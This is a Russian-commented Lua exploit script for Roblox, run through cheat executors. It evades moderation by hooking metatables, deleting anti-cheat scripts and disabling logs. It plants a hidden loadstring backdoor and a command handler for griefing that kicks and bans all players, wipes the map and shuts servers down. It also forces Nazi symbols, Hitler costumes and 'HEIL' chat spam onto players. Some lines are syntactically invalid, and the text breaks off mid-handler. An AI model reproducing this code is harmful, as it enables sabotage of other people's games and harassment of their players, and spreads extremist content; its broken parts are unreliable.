-- RYZEN ULTIMATE v11.0 "FOR ANY PLACE"
-- Запускать через Executor (Krnl/Synapse/script-ware)
-- Пароль: ryzen2025

local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")
local Debris = game:GetService("Debris")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer

-- ============================================================
-- 1. ПАРОЛЬ
-- ============================================================

local PASSWORD = "ryzen2025"

-- ============================================================
-- 2. СУПЕР-ЗАЩИТА ОТ АДМИНОВ
-- ============================================================

local function superAntiAdmin()
    pcall(function()
        player.DisplayName = "1x1x1x1"
        player.Name = "1x1x1x1"
    end)
    
    pcall(function()
        player.Kick = function() return end
        player:Destroy = function() return end
        getrawmetatable(player).__index = function(self, key)
            if key == "Kick" or key == "Destroy" then
                return function() return end
            end
            return rawget(self, key)
        end
    end)
    
    pcall(function()
        for _, v in pairs(game:GetDescendants()) do
            if v:IsA("Script") then
                local src = v.Source or ""
                if src:lower():match("anti") or src:lower():match("guard") or src:lower():match("cheat") or src:lower():match("detect") then
                    v.Disabled = true
                    v:Destroy()
                end
            end
            if v:IsA("ScreenGui") then
                local name = v.Name:lower()
                if name:match("admin") or name:match("mod") or name:match("staff") then
                    v:Destroy()
                end
            end
        end
    end)
    
    pcall(function()
        local mt = getrawmetatable(game)
        local old = mt.__namecall
        setreadonly(mt, false)
        mt.__namecall = newcclosure(function(self, ...)
            local args = {...}
            if args[1] == "FindFirstChild" and args[2] then
                local name = tostring(args[2])
                if name:match("Ryzen") or name:match("SystemCore") or name:match("Sys_") then
                    return nil
                end
            end
            return old(self, ...)
        end)
        setreadonly(mt, true)
    end)
    
    pcall(function()
        game:GetService("LogService"):SetLoggingEnabled(false)
    end)
end

superAntiAdmin()

-- ============================================================
-- 3. БЭКДОР
-- ============================================================

local backdoorModule = Instance.new("ModuleScript")
backdoorModule.Name = "SystemCore_" .. tostring(math.random(1000,99999))
backdoorModule.Source = [[
    local module = {}
    function module.Execute(code)
        local func, err = loadstring(code)
        if func then return pcall(func) end
        return false, err
    end
    function module.Hijack()
        for _, v in pairs(game:GetDescendants()) do
            if v:IsA("Script") then
                local src = v.Source or ""
                if src:lower():match("anti") or src:lower():match("guard") or src:lower():match("cheat") then
                    pcall(function() v.Disabled = true v:Destroy() end)
                end
            end
        end
        pcall(function() game:GetService("LogService"):SetLoggingEnabled(false) end)
        return "Hijacked"
    end
    return module
]]
backdoorModule.Parent = ReplicatedStorage

local ryzenCore = require(backdoorModule)
ryzenCore.Hijack()

-- ============================================================
-- 4. RemoteEvent
-- ============================================================

local remote = Instance.new("RemoteEvent")
remote.Name = "Ryzen_" .. tostring(math.random(10000,99999))
remote.Parent = ReplicatedStorage

spawn(function()
    while true do
        wait(15)
        remote.Name = "Ryzen_" .. tostring(math.random(10000,99999))
    end
end)

-- ============================================================
-- 5. ГЛОБАЛЬНОЕ УВЕДОМЛЕНИЕ
-- ============================================================

local function doGlobalNotify(message, color, duration)
    color = color or Color3.fromRGB(255, 255, 255)
    duration = duration or 10
    for _, plr in pairs(Players:GetPlayers()) do
        pcall(function()
            local g = Instance.new("ScreenGui")
            g.Name = "RyzenGlobalNotify"
            g.ResetOnSpawn = false
            g.Parent = plr.PlayerGui
            local frame = Instance.new("Frame")
            frame.Size = UDim2.new(1, 0, 0.2, 0)
            frame.Position = UDim2.new(0, 0, 0, 0)
            frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            frame.BackgroundTransparency = 0.2
            frame.BorderSizePixel = 0
            frame.Parent = g
            local text = Instance.new("TextLabel")
            text.Size = UDim2.new(1, 0, 1, 0)
            text.BackgroundTransparency = 1
            text.Text = message
            text.TextColor3 = color
            text.TextScaled = true
            text.Font = Enum.Font.GothamBold
            text.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
            text.TextStrokeTransparency = 0.3
            text.Parent = frame
            frame.Position = UDim2.new(0, 0, -0.2, 0)
            frame:TweenPosition(UDim2.new(0, 0, 0, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true)
            wait(duration)
            frame:TweenPosition(UDim2.new(0, 0, -0.2, 0), Enum.EasingDirection.In, Enum.EasingStyle.Quad, 0.5, true)
            wait(0.5)
            g:Destroy()
        end)
    end
end

-- ============================================================
-- 6. СОЗДАНИЕ 1x1x1x1
-- ============================================================

local function createBoss()
    local oldBoss = Workspace:FindFirstChild("x1x1x1x1_BOSS")
    if oldBoss then oldBoss:Destroy() end
    
    local boss = Instance.new("Model")
    boss.Name = "x1x1x1x1_BOSS"
    
    local body = Instance.new("Part")
    body.Size = Vector3.new(8, 8, 8)
    body.Position = Vector3.new(0, 4, 0)
    body.BrickColor = BrickColor.new("Really black")
    body.Material = Enum.Material.SmoothPlastic
    body.Anchored = true
    body.Parent = boss
    
    for i = -1, 1, 2 do
        local eye = Instance.new("Part")
        eye.Size = Vector3.new(0.8, 0.8, 0.8)
        eye.Position = body.Position + Vector3.new(i*1.5, 0.5, 4.5)
        eye.BrickColor = BrickColor.new("White")
        eye.Material = Enum.Material.SmoothPlastic
        eye.Anchored = true
        eye.Parent = boss
    end
    
    local mouth = Instance.new("Part")
    mouth.Size = Vector3.new(2, 0.3, 0.3)
    mouth.Position = body.Position + Vector3.new(0, -0.5, 4.5)
    mouth.BrickColor = BrickColor.new("Bright red")
    mouth.Material = Enum.Material.SmoothPlastic
    mouth.Anchored = true
    mouth.Parent = boss
    
    local billboard = Instance.new("BillboardGui")
    billboard.Size = UDim2.new(0, 10, 0, 2)
    billboard.StudsOffset = Vector3.new(0, 6, 0)
    billboard.Parent = body
    
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.Text = "👹 1x1x1x1 👹"
    label.TextColor3 = Color3.fromRGB(255, 0, 0)
    label.TextScaled = true
    label.Font = Enum.Font.GothamBold
    label.Parent = billboard
    
    local danceScript = Instance.new("Script")
    danceScript.Name = "RampageDance"
    danceScript.Source = [[
        local boss = script.Parent
        local body = boss:FindFirstChild("Part")
        while true do
            wait(0.05)
            if body then
                body.CFrame = body.CFrame * CFrame.Angles(0, 0.03, 0)
                body.Position = Vector3.new(0, 4 + math.sin(tick() * 2) * 0.5, 0)
            end
        end
    ]]
    danceScript.Parent = boss
    
    boss.Parent = Workspace
    return boss
end

-- ============================================================
-- 7. СОЗДАНИЕ КАРТЫ (ДЛЯ ЛЮБОГО ПЛЕЙСА)
-- ============================================================

local function createApocalypseMap()
    -- Удаляем всё, кроме игроков и босса
    for _, v in pairs(Workspace:GetChildren()) do
        pcall(function()
            if v:IsA("BasePart") and not v:IsDescendantOf(Players) and v.Name ~= "x1x1x1x1_BOSS" then
                v:Destroy()
            end
        end)
    end
    
    -- ОСНОВА (кровавая земля)
    local ground = Instance.new("Part")
    ground.Size = Vector3.new(400, 1, 400)
    ground.Position = Vector3.new(0, -0.5, 0)
    ground.BrickColor = BrickColor.new("Really black")
    ground.Material = Enum.Material.SmoothPlastic
    ground.Anchored = true
    ground.Parent = Workspace
    
    -- КРОВЬ НА ЗЕМЛЕ
    for i = 1, 150 do
        local blood = Instance.new("Part")
        blood.Size = Vector3.new(math.random(1,5), 0.1, math.random(1,5))
        blood.Position = Vector3.new(math.random(-180,180), 0, math.random(-180,180))
        blood.BrickColor = BrickColor.new("Bright red")
        blood.Material = Enum.Material.SmoothPlastic
        blood.Transparency = 0.3
        blood.Anchored = true
        blood.Parent = Workspace
    end
    
    -- СТЕНЫ
    for i = 1, 50 do
        local wall = Instance.new("Part")
        wall.Size = Vector3.new(math.random(5,20), math.random(3,8), math.random(5,20))
        wall.Position = Vector3.new(math.random(-180,180), math.random(1,4), math.random(-180,180))
        wall.BrickColor = BrickColor.new(math.random(1,2) == 1 and "Bright red" or "Really black")
        wall.Material = Enum.Material.SmoothPlastic
        wall.Anchored = true
        wall.Parent = Workspace
    end
    
    -- ПАРКУР
    for i = 1, 40 do
        local platform = Instance.new("Part")
        platform.Size = Vector3.new(math.random(3,10), 0.5, math.random(3,10))
        platform.Position = Vector3.new(math.random(-170,170), math.random(2,18), math.random(-170,170))
        platform.BrickColor = BrickColor.new("Bright red")
        platform.Material = Enum.Material.SmoothPlastic
        platform.Anchored = true
        platform.Parent = Workspace
    end
    
    -- ОЗЁРА КРОВИ
    for i = 1, 10 do
        local lake = Instance.new("Part")
        lake.Size = Vector3.new(math.random(10,30), 0.5, math.random(10,30))
        lake.Position = Vector3.new(math.random(-170,170), -0.2, math.random(-170,170))
        lake.BrickColor = BrickColor.new("Bright red")
        lake.Material = Enum.Material.SmoothPlastic
        lake.Transparency = 0.5
        lake.Anchored = true
        lake.Parent = Workspace
    end
    
    -- КРАСНОЕ НЕБО
    local sky = Lighting:FindFirstChild("Sky") or Instance.new("Sky", Lighting)
    sky.SkyboxBk = "rbxassetid://15050311563"
    sky.SkyboxDn = "rbxassetid://15050311563"
    sky.SkyboxLf = "rbxassetid://15050311563"
    sky.SkyboxRt = "rbxassetid://15050311563"
    sky.SkyboxUp = "rbxassetid://15050311563"
    Lighting.FogColor = Color3.fromRGB(200,50,50)
    Lighting.FogEnd = 300
    Lighting.Brightness = 1.5
    Lighting.Ambient = Color3.fromRGB(100,0,0)
    
    -- СОЗДАЁМ БОССА
    createBoss()
    
    doGlobalNotify("🌋 КРОВАВАЯ КАРТА СОЗДАНА! 1x1x1x1 ЖДЁТ!", Color3.fromRGB(255,0,0), 4)
end

-- ============================================================
-- 8. ВСЕ ФУНКЦИИ
-- ============================================================

local function doZig()
    for _, plr in pairs(Players:GetPlayers()) do
        pcall(function()
            local char = plr.Character
            if char and char:FindFirstChild("Humanoid") then
                local anim = Instance.new("Animation")
                anim.AnimationId = "rbxassetid://148840371"
                local track = char.Humanoid:LoadAnimation(anim)
                track:Play()
            end
        end)
    end
end

local function doSwastika()
    for _, plr in pairs(Players:GetPlayers()) do
        pcall(function()
            local char = plr.Character
            if char and char:FindFirstChild("Head") then
                for _, child in ipairs(char.Head:GetChildren()) do
                    if child:IsA("BillboardGui") and child.Name == "SwastikaGUI" then
                        child:Destroy()
                    end
                end
                local bill = Instance.new("BillboardGui")
                bill.Name = "SwastikaGUI"
                bill.Size = UDim2.new(0, 3, 0, 3)
                bill.AlwaysOnTop = true
                local img = Instance.new("ImageLabel")
                img.Image = "rbxassetid://1234567890"
                img.Size = UDim2.new(1,0,1,0)
                img.BackgroundTransparency = 1
                img.Parent = bill
                bill.Parent = char.Head
            end
        end)
    end
end

local function doHellSky()
    pcall(function()
        local sky = Lighting:FindFirstChild("Sky") or Instance.new("Sky", Lighting)
        sky.SkyboxBk = "rbxassetid://10221158754"
        sky.SkyboxDn = "rbxassetid://10221158754"
        sky.SkyboxLf = "rbxassetid://10221158754"
        sky.SkyboxRt = "rbxassetid://10221158754"
        sky.SkyboxUp = "rbxassetid://10221158754"
        Lighting.FogColor = Color3.fromRGB(255,0,0)
        Lighting.FogEnd = 150
        Lighting.Brightness = 0.5
    end)
end

local function doBloodySky()
    pcall(function()
        local sky = Lighting:FindFirstChild("Sky") or Instance.new("Sky", Lighting)
        sky.SkyboxBk = "rbxassetid://15050311563"
        sky.SkyboxDn = "rbxassetid://15050311563"
        sky.SkyboxLf = "rbxassetid://15050311563"
        sky.SkyboxRt = "rbxassetid://15050311563"
        sky.SkyboxUp = "rbxassetid://15050311563"
        Lighting.FogColor = Color3.fromRGB(200,50,50)
        Lighting.FogEnd = 200
        Lighting.Brightness = 2
    end)
end

local function doTeleport()
    local placeId = game.PlaceId
    for _, plr in pairs(Players:GetPlayers()) do
        pcall(function() TeleportService:Teleport(placeId, plr) end)
    end
end

local function doSpawnTank()
    pcall(function()
        local tank = Instance.new("Model")
        tank.Name = "RyzenTank"
        local body = Instance.new("Part")
        body.Size = Vector3.new(8,2,5)
        body.BrickColor = BrickColor.new("Dark green")
        body.Position = Vector3.new(0,2,0)
        body.Anchored = false
        body.Parent = tank
        local turret = Instance.new("Part")
        turret.Size = Vector3.new(3,1.5,3)
        turret.BrickColor = BrickColor.new("Dark green")
        turret.Position = Vector3.new(0,3.5,0)
        turret.Anchored = false
        turret.Parent = tank
        for x = -1,1,2 do for z = -1,1,2 do
            local wheel = Instance.new("Part")
            wheel.Size = Vector3.new(0.8,0.8,0.5)
            wheel.BrickColor = BrickColor.new("Black")
            wheel.Position = Vector3.new(x*2.5,0.5,z*2)
            wheel.Anchored = false
            wheel.Parent = tank
        end end
        tank.Parent = Workspace
    end)
end

local function doBigEffects()
    for i = 1, 15 do
        pcall(function()
            local part = Instance.new("Part")
            part.Size = Vector3.new(15,15,15)
            part.Position = Vector3.new(math.random(-80,80), math.random(0,20), math.random(-80,80))
            part.Material = Enum.Material.Neon
            part.Color = Color3.fromRGB(math.random(200,255), math.random(0,50), math.random(0,50))
            part.Anchored = true
            part.CanCollide = false
            part.Transparency = 0.3
            part.Parent = Workspace
            Debris:AddItem(part, 2.5)
        end)
        wait(0.05)
    end
end

local music = nil
local function doPlayMusic()
    pcall(function()
        if music then music:Stop() music:Destroy() music = nil end
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://9116468226"
        sound.Volume = 0.4
        sound.Looped = true
        sound.Parent = Workspace
        sound:Play()
        music = sound
    end)
end

local function doStopMusic()
    pcall(function() if music then music:Stop() music:Destroy() music = nil end end)
end

local function doDanceAll(danceType)
    local danceIds = {
        ["default"] = "rbxassetid://148840371",
        ["robot"] = "rbxassetid://507771000",
        ["gangnam"] = "rbxassetid://2554341089"
    }
    local animId = danceIds[danceType] or danceIds["default"]
    for _, plr in pairs(Players:GetPlayers()) do
        pcall(function()
            local char = plr.Character
            if char and char:FindFirstChild("Humanoid") then
                for _, track in ipairs(char.Humanoid:GetPlayingAnimationTracks()) do track:Stop() end
                local anim = Instance.new("Animation")
                anim.AnimationId = animId
                local track = char.Humanoid:LoadAnimation(anim)
                track.Looped = true
                track:Play()
            end
        end)
    end
end

local function doHitlerAll()
    for _, plr in pairs(Players:GetPlayers()) do
        pcall(function()
            local char = plr.Character
            if char then
                local shirt = char:FindFirstChild("Shirt")
                local pants = char:FindFirstChild("Pants")
                if shirt then shirt.ShirtTemplate = "rbxassetid://1234567890" end
                if pants then pants.PantsTemplate = "rbxassetid://1234567890" end
                local mustache = Instance.new("Part")
                mustache.Size = Vector3.new(0.4,0.1,0.1)
                mustache.BrickColor = BrickColor.new("Really black")
                mustache.Position = char.Head.Position + Vector3.new(0,-0.2,0.4)
                mustache.Anchored = true
                mustache.CanCollide = false
                mustache.Parent = char.Head
            end
        end)
    end
end

local function doBloodyTextures()
    for _, part in pairs(Workspace:GetDescendants()) do
        pcall(function()
            if part:IsA("BasePart") and not part:IsDescendantOf(Players) then
                part.Color = Color3.fromRGB(math.random(150,255),0,0)
                part.Material = Enum.Material.SmoothPlastic
            end
        end)
    end
    pcall(function()
        Lighting.FogColor = Color3.fromRGB(180,0,0)
        Lighting.FogEnd = 80
        Lighting.Brightness = 0.4
    end)
end

local zombieConnections = {}
local function doZombieWalk()
    for _, plr in pairs(Players:GetPlayers()) do
        pcall(function()
            local char = plr.Character
            if char and char:FindFirstChild("Humanoid") then
                char.Humanoid.WalkSpeed = 8
                char.Humanoid.JumpPower = 0
                if not zombieConnections[plr] then
                    zombieConnections[plr] = RunService.Heartbeat:Connect(function()
                        if char and char:FindFirstChild("HumanoidRootPart") then
                            local root = char.HumanoidRootPart
                            root.RotVelocity = Vector3.new(math.sin(tick()*2)*0.5,0,math.cos(tick()*2)*0.5)
                        end
                    end)
                end
            end
        end)
    end
end

local function doRandomTeleport()
    for _, plr in pairs(Players:GetPlayers()) do
        pcall(function()
            local char = plr.Character
            if char and char:FindFirstChild("HumanoidRootPart") then
                char.HumanoidRootPart.Position = Vector3.new(math.random(-100,100),10,math.random(-100,100))
            end
        end)
    end
end

local function doHellWeather()
    for i = 1, 50 do
        pcall(function()
            local part = Instance.new("Part")
            part.Size = Vector3.new(0.5,0.5,0.5)
            part.Position = Vector3.new(math.random(-150,150), math.random(50,150), math.random(-150,150))
            part.BrickColor = BrickColor.new("Bright red")
            part.Material = Enum.Material.Neon
            part.Anchored = true
            part.CanCollide = false
            part.Parent = Workspace
            RunService.Heartbeat:Connect(function()
                if part and part.Parent then
                    part.Position = part.Position + Vector3.new(0,-2,0)
                    if part.Position.Y < -50 then part:Destroy() end
                end
            end)
            Debris:AddItem(part, 5)
        end)
    end
end

local function doChatSpam()
    local messages = {"HEIL RYZEN!", "СЛАВА РЕЙХУ!", "МЫ ИДЁМ!", "КРОВЬ ЗА КРОВЬ!"}
    for _, plr in pairs(Players:GetPlayers()) do
        for i = 1, 5 do
            pcall(function() plr:Chat(messages[math.random(1,#messages)]) end)
            wait(0.3)
        end
    end
end

local function doBloodMonster()
    pcall(function()
        local monster = Instance.new("Model")
        monster.Name = "BloodMonster"
        for i = 1, 20 do
            local part = Instance.new("Part")
            part.Size = Vector3.new(math.random(5,15), math.random(5,15), math.random(5,15))
            part.Position = Vector3.new(math.random(-30,30), math.random(0,20), math.random(-30,30))
            part.BrickColor = BrickColor.new("Bright red")
            part.Material = Enum.Material.Neon
            part.Anchored = true
            part.CanCollide = false
            part.Transparency = 0.3
            part.Parent = monster
        end
        monster.Parent = Workspace
        Debris:AddItem(monster, 30)
    end)
end

local function doMapDestroy()
    for _, v in pairs(Workspace:GetChildren()) do
        pcall(function()
            if v:IsA("BasePart") and not v:IsDescendantOf(Players) and v.Name ~= "x1x1x1x1_BOSS" then
                v:Destroy()
            end
        end)
    end
    createApocalypseMap()
    for _, plr in pairs(Players:GetPlayers()) do
        pcall(function()
            local char = plr.Character
            if char and char:FindFirstChild("HumanoidRootPart") then
                char.HumanoidRootPart.Position = Vector3.new(math.random(-50,50), 10, math.random(-50,50))
            end
        end)
    end
    doGlobalNotify("🌋 НОВАЯ КАРТА СОЗДАНА!", Color3.fromRGB(255,0,0), 5)
end

local function doHellMap()
    for i = 1, 100 do
        pcall(function()
            local lava = Instance.new("Part")
            lava.Size = Vector3.new(5,0.5,5)
            lava.Position = Vector3.new(math.random(-150,150),0,math.random(-150,150))
            lava.BrickColor = BrickColor.new("Bright orange")
            lava.Material = Enum.Material.Neon
            lava.Anchored = true
            lava.CanCollide = false
            lava.Transparency = 0.5
            lava.Parent = Workspace
            local fire = Instance.new("ParticleEmitter", lava)
            fire.Texture = "rbxassetid://2738699127"
            fire.Rate = 50
            fire.Lifetime = NumberRange.new(2,4)
            fire.SpreadAngle = Vector2.new(360,360)
            fire.VelocityInheritance = 0
        end)
    end
end

local function doGraveyard()
    for i = 1, 30 do
        pcall(function()
            local grave = Instance.new("Part")
            grave.Size = Vector3.new(1,0.5,2)
            grave.Position = Vector3.new(math.random(-80,80),0.5,math.random(-80,80))
            grave.BrickColor = BrickColor.new("Dark grey")
            grave.Material = Enum.Material.Sandstone
            grave.Anchored = true
            grave.Parent = Workspace
            local cross = Instance.new("Part")
            cross.Size = Vector3.new(0.3,2,0.3)
            cross.Position = grave.Position + Vector3.new(0,1.5,0)
            cross.BrickColor = BrickColor.new("Dark grey")
            cross.Anchored = true
            cross.Parent = Workspace
        end)
    end
end

local function doFlipScreen()
    for _, plr in pairs(Players:GetPlayers()) do
        pcall(function()
            local gui = plr.PlayerGui:FindFirstChild("RyzenGUI")
            if gui then gui.Rotation = 180 end
        end)
    end
end

local function doRenameTroll()
    local names = {"Hitler", "Stalin", "Mussolini", "Mao", "Kim"}
    for _, plr in pairs(Players:GetPlayers()) do
        pcall(function()
            local name = names[math.random(1,#names)]
            plr.DisplayName = name
            plr.Name = name
        end)
    end
end

local function doScareAll(plr)
    for _, p in pairs(Players:GetPlayers()) do
        if p ~= plr then
            pcall(function()
                local sound = Instance.new("Sound")
                sound.SoundId = "rbxassetid://9104997024"
                sound.Volume = 1.5
                sound.Parent = Workspace
                sound:Play()
                Debris:AddItem(sound, 5)
                local g = Instance.new("ScreenGui")
                g.Name = "ScareGUI"
                g.ResetOnSpawn = false
                g.Parent = p.PlayerGui
                local f = Instance.new("Frame")
                f.Size = UDim2.new(1,0,1,0)
                f.BackgroundColor3 = Color3.fromRGB(255,0,0)
                f.BackgroundTransparency = 0
                f.Parent = g
                wait(0.3)
                f:TweenBackgroundTransparency(1, Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true)
                wait(0.5)
                g:Destroy()
            end)
        end
    end
end

local function doOneDotMap()
    for _, v in pairs(Workspace:GetDescendants()) do
        pcall(function()
            if v:IsA("BasePart") and not v:IsDescendantOf(Players) and v.Name ~= "x1x1x1x1_BOSS" then
                v.Size = Vector3.new(1,1,1)
                v.Color = Color3.fromRGB(math.random(50,255), math.random(50,255), math.random(50,255))
                v.Material = Enum.Material.SmoothPlastic
            end
        end)
    end
end

local function doScaryEffects()
    for i = 1, 30 do
        pcall(function()
            local p = Instance.new("Part")
            p.Size = Vector3.new(0.3,0.3,0.3)
            p.Position = Vector3.new(math.random(-200,200), math.random(50,150), math.random(-200,200))
            p.BrickColor = BrickColor.new("Bright red")
            p.Material = Enum.Material.Neon
            p.Anchored = false
            p.CanCollide = false
            p.Velocity = Vector3.new(0,-10,0)
            p.Parent = Workspace
            Debris:AddItem(p, 5)
        end)
    end
    for i = 1, 5 do
        pcall(function()
            local flash = Instance.new("Part")
            flash.Size = Vector3.new(1,50,1)
            flash.Position = Vector3.new(math.random(-100,100), math.random(20,40), math.random(-100,100))
            flash.BrickColor = BrickColor.new("White")
            flash.Material = Enum.Material.Neon
            flash.Anchored = true
            flash.CanCollide = false
            flash.Transparency = 0.5
            flash.Parent = Workspace
            Debris:AddItem(flash, 0.5)
            local thunder = Instance.new("Sound")
            thunder.SoundId = "rbxassetid://9120390372"
            thunder.Volume = 0.8
            thunder.Parent = Workspace
            thunder:Play()
            Debris:AddItem(thunder, 2)
        end)
    end
end

local function doGiveAK(plr)
    pcall(function()
        local tool = Instance.new("Tool")
        tool.Name = "AK-47"
        tool.RequiresHandle = true
        tool.Parent = plr.Backpack
        local handle = Instance.new("Part")
        handle.Size = Vector3.new(1,0.5,2)
        handle.BrickColor = BrickColor.new("Really black")
        handle.Material = Enum.Material.SmoothPlastic
        handle.Parent = tool
        local script = Instance.new("Script")
        script.Name = "GunScript"
        script.Source = [[
            local tool = script.Parent
            local player = game.Players.LocalPlayer
            local char = player.Character
            tool.Activated:Connect(function()
                if not char then return end
                local part = Instance.new("Part")
                part.Size = Vector3.new(0.2,0.2,0.2)
                part.BrickColor = BrickColor.new("Bright red")
                part.Material = Enum.Material.Neon
                part.CanCollide = false
                part.Position = tool.Handle.Position + (char:FindFirstChild("Right Arm") and char.RightArm.CFrame.LookVector*3 or Vector3.new(0,0,0))
                part.Velocity = (char:FindFirstChild("Right Arm") and char.RightArm.CFrame.LookVector*200 or Vector3.new(0,0,0))
                part.Parent = game.Workspace
                game:GetService("Debris"):AddItem(part, 2)
                part.Touched:Connect(function(hit)
                    if hit.Parent and hit.Parent:FindFirstChild("Humanoid") and hit.Parent ~= char then
                        hit.Parent.Humanoid.Health = hit.Parent.Humanoid.Health - 20
                    end
                end)
            end)
        ]]
        script.Parent = tool
    end)
end

local function doGiveAKAll()
    for _, p in pairs(Players:GetPlayers()) do doGiveAK(p) end
end

local function doRemoveAKAll()
    for _, p in pairs(Players:GetPlayers()) do
        pcall(function()
            for _, v in pairs(p.Backpack:GetChildren()) do
                if v:IsA("Tool") and v.Name == "AK-47" then v:Destroy() end
            end
            if p.Character then
                for _, v in pairs(p.Character:GetChildren()) do
                    if v:IsA("Tool") and v.Name == "AK-47" then v:Destroy() end
                end
            end
        end)
    end
end

local function doGiveAdmin(plr)
    pcall(function()
        local char = plr.Character
        if char then
            local adminScript = Instance.new("Script")
            adminScript.Name = "__RyzenAdmin__"
            adminScript.Source = [[
                local player = game.Players.LocalPlayer
                local char = player.Character
                if char and char:FindFirstChild("Humanoid") then
                    char.Humanoid.MaxHealth = math.huge
                    char.Humanoid.Health = math.huge
                    char.Humanoid.WalkSpeed = 50
                    char.Humanoid.JumpPower = 100
                end
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "🔓 ADMIN ACTIVATED",
                    Text = "Полный контроль!",
                    Duration = 5
                })
            ]]
            adminScript.Parent = plr.PlayerGui
            plr.DisplayName = "[ADMIN] " .. plr.DisplayName
        end
    end)
end

local function doGiveAdminAll()
    for _, plr in pairs(Players:GetPlayers()) do doGiveAdmin(plr) end
end

local function doGiveItems(plr, itemType)
    if itemType == "money" then
        pcall(function()
            local ls = plr:FindFirstChild("leaderstats")
            if ls then
                local cash = ls:FindFirstChild("Cash") or ls:FindFirstChild("Money")
                if cash then cash.Value = cash.Value + 100000 end
            end
        end)
    elseif itemType == "weapons" then
        for _, v in pairs(ReplicatedStorage:GetChildren()) do
            pcall(function()
                if v:IsA("Tool") and (v.Name:lower():match("gun") or v.Name:lower():match("sword")) then
                    v:Clone().Parent = plr.Backpack
                end
            end)
        end
    elseif itemType == "all" then
        for _, v in pairs(ReplicatedStorage:GetChildren()) do
            pcall(function()
                if v:IsA("Tool") then v:Clone().Parent = plr.Backpack end
            end)
        end
        pcall(function()
            local ls = plr:FindFirstChild("leaderstats")
            if ls then
                local cash = ls:FindFirstChild("Cash") or ls:FindFirstChild("Money")
                if cash then cash.Value = cash.Value + 999999 end
            end
        end)
    end
end

local function doGodMode(plr)
    pcall(function()
        local char = plr.Character
        if char and char:FindFirstChild("Humanoid") then
            char.Humanoid.MaxHealth = math.huge
            char.Humanoid.Health = math.huge
            char.Humanoid.BreakJointsOnDeath = false
            local godScript = Instance.new("Script")
            godScript.Name = "__GodMode__"
            godScript.Source = [[
                local player = game.Players.LocalPlayer
                while player.Character do
                    wait(0.1)
                    local char = player.Character
                    if char and char:FindFirstChild("Humanoid") then
                        char.Humanoid.Health = char.Humanoid.MaxHealth
                    end
                end
            ]]
            godScript.Parent = plr.PlayerGui
        end
    end)
end

local function doKickAll(plr, msg)
    for _, p in pairs(Players:GetPlayers()) do
        if p ~= plr then pcall(function() p:Kick(msg or "🔨 KICKED BY RYZEN") end) end
    end
end

local function doBanAll(plr)
    for _, p in pairs(Players:GetPlayers()) do
        if p ~= plr then
            pcall(function()
                p:Kick("🚫 PERMABANNED BY RYZEN")
                pcall(function()
                    game:GetService("DataStoreService"):GetDataStore("Bans"):SetAsync(p.UserId, true)
                end)
            end)
        end
    end
end

local function doDeleteMapPermanently()
    for _, v in pairs(game:GetDescendants()) do
        pcall(function()
            if v:IsA("Script") or v:IsA("LocalScript") then
                if v.Name:lower():match("map") or v.Name:lower():match("spawn") or v.Name:lower():match("generate") then
                    v.Disabled = true
                    v:Destroy()
                end
            end
        end)
    end
    for _, v in pairs(Workspace:GetChildren()) do
        pcall(function()
            if v:IsA("BasePart") and not v:IsDescendantOf(Players) and v.Name ~= "x1x1x1x1_BOSS" then
                v:Destroy()
            end
        end)
    end
end

local function doNukeServer()
    doGlobalNotify("🔥 СЕРВЕР УНИЧТОЖАЕТСЯ! ВЫ БУДЕТЕ ПЕРЕЗАГРУЖЕНЫ 🔥", Color3.fromRGB(255,255,255), 5)
    wait(2)
    for _, v in pairs(game:GetDescendants()) do
        pcall(function()
            if v:IsA("Script") or v:IsA("LocalScript") or v:IsA("ModuleScript") then
                v.Disabled = true
                v:Destroy()
            end
        end)
    end
    for _, v in pairs(Workspace:GetChildren()) do
        pcall(function() v:Destroy() end)
    end
    for _, v in pairs(game:GetDescendants()) do
        pcall(function()
            if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
                v:Destroy()
            end
        end)
    end
    for _, plr in pairs(Players:GetPlayers()) do
        pcall(function()
            for _, gui in pairs(plr.PlayerGui:GetChildren()) do
                gui:Destroy()
            end
        end)
    end
    pcall(function()
        Lighting.Brightness = 0
        Lighting.Ambient = Color3.fromRGB(0,0,0)
        Lighting.FogEnd = 0
    end)
    wait(2)
    for _, plr in pairs(Players:GetPlayers()) do
        pcall(function() plr:Kick("💀 СЕРВЕР УНИЧТОЖЕН 1x1x1x1 💀") end)
    end
    pcall(function()
        local placeId = game.PlaceId
        TeleportService:Teleport(placeId, player)
    end)
    pcall(function() game:Shutdown() end)
end

-- ============================================================
-- 9. ОБРАБОТЧИК КОМАНД
-- ============================================================

remote.OnServerEvent:Connect(function(plr, action, data)
    if action == "zig" then doZig()
    elseif action == "swastika" then doSwastika()
    elseif action == "hellsky" then doHellSky()
    elseif action == "bloodysky" then doBloodySky()
    elseif action == "teleport" then doTeleport()
    elseif action == "tank" then doSpawnTank()
    elseif action == "effects" then doBigEffects()
    elseif action == "music" then doPlayMusic()
    elseif action == "stopmusic" then doStopMusic()
    elseif action == "dance" then doDanceAll(data or "default")
    elseif action == "hitler" then doHitlerAll()
    elseif action == "bloody" then doBloodyTextures()
    elseif action == "zombie" then doZombieWalk()
    elseif action == "randomtp" then doRandomTeleport()
    elseif action == "hellweather" then doHellWeather()
    elseif action == "chatspam" then doChatSpam()
    elseif action == "bloodmonster" then doBloodMonster()
    elseif action == "mapdestroy" then doMapDestroy()
    elseif action == "hellmap" then doHellMap()
    elseif action == "graveyard" then doGraveyard()
    elseif action == "flipscreen" then doFlipScreen()
    elseif action == "renametroll" then doRenameTroll()
    elseif action == "scareall" then doScareAll(plr)
    elseif action == "onedotmap" then doOneDotMap()
    elseif action == "scaryeffects" then doScaryEffects()
    elseif action == "giveak" then doGiveAK(plr)
    elseif action == "giveakall" then doGiveAKAll()
    elseif action == "removeakall" then doRemoveAKAll()
    elseif action == "deletemap" then doDeleteMapPermanently()
    elseif action == "createmap" then createApocalypseMap()
